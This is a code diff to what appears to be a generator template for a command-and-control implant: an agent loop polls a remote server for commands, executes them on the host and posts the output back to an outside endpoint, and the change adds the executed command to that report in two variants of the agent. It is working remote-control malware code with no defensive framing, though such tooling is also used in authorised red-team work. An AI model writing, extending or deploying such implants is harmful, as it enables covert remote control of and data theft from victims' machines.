@@ -277,9 +277,9 @@ def download_file_from_server(filename):
     except Exception as e:
         return f"Error: {{e}}"
 
-def send_output(output):
+def send_output(output,command_to_execute):
     try:
-        response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, headers=headers, allow_redirects=True)
+        response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output,'command':command_to_execute}}, headers=headers, allow_redirects=True)
         #response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
         print("Response Status:", response.status_code)
         print("Response Text:", response.text)
@@ -317,7 +317,7 @@ def main():
                 command_to_execute = response.json().get('command', '')
                 if command_to_execute:
                     output = execute_command(command_to_execute)
-                    send_output(output)
+                    send_output(output,command_to_execute)
             time.sleep({sleepTimer})
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
@@ -452,9 +452,9 @@ def download_file_from_server(filename):
     except Exception as e:
         return f"Error: {{e}}"
 
-def send_output(output):
+def send_output(output,command_to_execute):
     try:
-        response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+        response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output, 'command':command_to_execute}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
         #response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, verify=SERVER_CERT, allow_redirects=True)
         print("Response Status:", response.status_code)
         print("Response Text:", response.text)
@@ -492,7 +492,7 @@ def main():
                 command_to_execute = response.json().get('command', '')
                 if command_to_execute:
                     output = execute_command(command_to_execute)
-                    send_output(output)
+                    send_output(output,command_to_execute)
             time.sleep({sleepTimer})  # Random sleep between retries
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
